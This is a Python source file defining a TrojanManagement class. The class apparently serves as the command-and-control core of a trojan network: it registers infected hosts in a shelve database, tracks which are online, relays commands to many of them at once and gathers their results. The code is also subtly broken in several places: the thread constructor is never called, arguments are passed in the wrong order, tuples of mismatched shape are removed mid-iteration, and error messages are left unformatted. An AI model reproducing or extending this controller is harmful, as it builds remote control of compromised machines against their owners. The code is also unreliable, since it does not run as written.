import threading
import shelve


class TrojanManagement(threading.Thread):
    # TODO: Method docs
    def __init__(self, shelve_filename):
        self.shelve_filename = shelve_filename
        # The shelf contains the persistent data about the trojans, such as logs, meta data etc.
        # If something is a key in the shelf also determines, whether that trojan already is registered
        self.shelf = self.load_shelf()

        # The return dict contains the trojan ids and the commands executed on them as combined string keys and the
        # return values from those processes as the values
        self.return_dict = {}

        # The trojan dict contains the trojan ids as string keys and the Trojan objects as values
        self.trojan_dict = {}

        # This is a temporary list, that buffers tripels about commands executed on trojans, but the returns not yet
        # aquired: (trojan_id, command_id, command_name)
        self._pending_returns = []
        self.running = False

    def run(self):
        self.running = True

        while self.running:
            # TODO: Put those processes into their own methods
            # TODO: Add a logging process, that monitors the length of those collections and the time needed for the loops
            # Garbage collection
            self.collect_garbage()

            # Getting the returns
            for trojan_id, command_id, command_name in self._pending_returns:
                if self[trojan_id].has_return(command_id):
                    return_value = self[trojan_id].get_return(command_id)
                    # Adding the return to the return dict
                    self.return_dict[(trojan_id, command_id, command_name)] = return_value
                    # Removing from the list, as the result is not pending anymore
                    self._pending_returns.remove((trojan_id, command_id))

            # Updating the database
            self.sync_shelf()

    def register_trojan(self, trojan_id):
        """
        This method will register a new trojan into the persistent shelf database, if it is not already registered. In
        case it is attempted to do that in case the trojan id is already in the database, an error will be risen.
        Raises:
            KeyError: In case a trojan id is used, which is already in the database
        Args:
            trojan_id: The string id for which a new shelf entry is to be created

        Returns:
        void
        """
        # Checking first if that id is already registered, because this method cannot be used for overriding an entry
        # raising an error, in case already registered
        if self.trojan_registered(trojan_id):
            raise KeyError("Attempting to override data, already registered to {}".format(trojan_id))

        # Simply adding a new entry to the shelf database
        # TODO: extend that, what is saved in persistency
        self.shelf[trojan_id] = {}

    def add_trojan(self, trojan):
        """
        This method takes a Trojan object and from that its id and if this trojan is already registered in the
        persistent database, then it is simply added to the dict of currently online trojans, in case it is a
        completely new trojan, it is being registered first and then added to the list of online trojans by calling
        this method recursively.
        Args:
            trojan: The trojan object to be added to the management

        Returns:
        void
        """
        # Adding the trojan to the trojan manage dict, in case the trojan already registered in shelf
        if self.trojan_registered(trojan.id):
            self.trojan_dict[trojan.id] = trojan
        else:
            self.register_trojan(trojan.id)
            # Now that the trojan is registered, the method can be called recursively
            self.add_trojan(trojan)

    def trojan_registered(self, trojan_id):
        """
        This method returns if a trojan by the given string id is already registered in the persistent database
        Args:
            trojan_id: The string id of the trojan to be checked fro registration

        Returns:
        The boolean value of whether or not the trojan is already registered
        """
        return trojan_id in self.shelf.keys()

    def trojan_online(self, trojan_id):
        """
        This method returns if the trojan by the given id is currently online in the management system
        Args:
            trojan_id: The string id of the trojan to be checked for being online or not

        Returns:
        The boolean value of whether or not that trojan is currently online
        """
        if trojan_id in self.trojan_dict.keys():
            if self[trojan_id].online:
                return True
            else:
                self.terminate_trojan(trojan_id)

        return False

    def execute(self, trojan_id_list, command, priority, pos_args, kw_args, treat_missing=False):
        """
        This method is used to execute commands on the trojans, to do that it takes the list of trojan ids, for whose
        corresponding trojan objects the command is to be executed, the command name, the priority and the arguments
        of that command call. The command command call will then be relayed to all the trojans of the list, that are
        currently online, by calling the execute method of that trojan object. The treat-missing flag can be set to
        True and then an exception will be risen in case one of the trojans inf the given list is unavailable. If
        False (default) a list of all the trojan ids, that were online is returned together with a list of command
        ids of that trojans, with which the return values can be fetched from the trojans later.

        This information about the trojan ids and the command ids is being put into the pending returns list of the
        management container, which is iterated in every cycle of the main loop and every return that is available
        then will be put into the returns dictionary of the management object, where the return values can be
        accessed easily. That means to fetch the return one only has to wait for it to appear in that dict.
        Args:
            trojan_id_list: The list of string id's of the trojans for which the command shall be executed
            command: The string name of the command
            priority: An integer value for the priority of that command
            pos_args: The list of pos arguments for that command call. Order is important!
            kw_args: The dict with keyword arguments for the command call. spelling of keys is important!
            treat_missing: The flag, that determines whether an error shall be risen every time one trojan of the
                given list is unavailable.

        Returns:
        The tuple (trojan_ids, command_ids) where trojan ids is a sub list of the passed trojan list, and contains all
        the ids of the trojans, for which the command could actually be issued cause they were online, and the command
        ids the list of the command ids used for getting the return value for that specific command call later from the
        trojan. The lists have the same length and co-align with order -> command id matches trojan id
        """
        # This list will be used to save all the trojan id's for which the command could at least be issued to the
        # according Trojan object, because the trojan with that id both exists and is online
        successfully_passed = []

        # The list with the id's, so that the return values can be fetched from the outputs of the trojans after the
        # command has been processed
        command_ids = []

        # Going through the list of the trojans for which to execute the command
        for trojan_id in trojan_id_list:

            # Only if the flag is set True, exceptions will be risen if a command could not be issued to a Trojan,
            # because it either does not exist, or is not online atm.
            if treat_missing:
                if not self.trojan_registered(trojan_id):
                    raise KeyError("The trojan by the id '{}' does not exist")
                else:
                    if not self.trojan_online(trojan_id):
                        raise KeyError("The trojan by the id '{}' is not online")

            # In case the trojan is online passing it the command and adding the id to the list of actually online tr.
            if self.trojan_online(trojan_id):
                command_id = self[trojan_id].execute(command, priority, pos_args, kw_args)
                command_ids.append(command_id)
                successfully_passed.append(trojan_id)

        # Adding the trojan ids and the command ids to the pending returns list
        self._add_pending_returns(successfully_passed, command_ids, command)

        return successfully_passed, command_ids

    def load_shelf(self):
        """
        This method simply uses the attribute about the path of the shelve database used for the persistent storage of
        trojan data and loads the actual shelf object with that. Which is also returned
        Returns:
        The Shelf object loaded from the path, given by the 'shelve_path' attribute
        """
        # TODO: catch the exceptions and rise more specific ones
        shelf = shelve.open(self.shelve_filename)
        return shelf

    def sync_shelf(self):
        """
        The trojan management system uses a Shelf object as persistent data storage for trojan data. This object does
        not write back all the changes to the persistent disk in the instant they are changed though, they are only
        being save to the actual hard drive every time this method is called
        Returns:
        void
        """
        self.shelf.sync()

    def collect_garbage(self):
        """
        This method iterates through the trojan dictionary and checks if the trojans are online or not and if a
        trojan is not online it will be removed from the dict.
        Returns:
        void
        """
        items = list(self.trojan_dict.items())
        for trojan_id, trojan in items:
            if not trojan.online:
                # Terminating the trojan finally and removing it from the dict
                self.terminate_trojan(trojan_id)

    def terminate_trojan(self, trojan_id):
        """
        This method calls the final terminate method of the trojan addressed by the trojan id. The trojan has to be in
        the trojan dict (doesn't matter if actually online). Then deletes that trojan from the trojan dict
        Args:
            trojan_id: The string id of the trojan to be removed and terminated from the management

        Returns:
        void
        """
        if trojan_id in self.trojan_dict.keys():
            self[trojan_id].terminate()
            del self.trojan_dict[trojan_id]

    def _add_pending_returns(self, command_name, trojan_ids, command_ids):
        tuple_list = list(zip(trojan_ids, command_ids, command_name))
        self._pending_returns += tuple_list

    def __getitem__(self, item):
        """
        The management object can be indexed with a string, which is supposed to be a trojan id and the trojan manage
        will then return that trojan object, if that trojan is online
        Args:
            item: The string id of the trojan to be returned

        Returns:
        The Trojan object having that id
        """
        return self.trojan_dict[item]

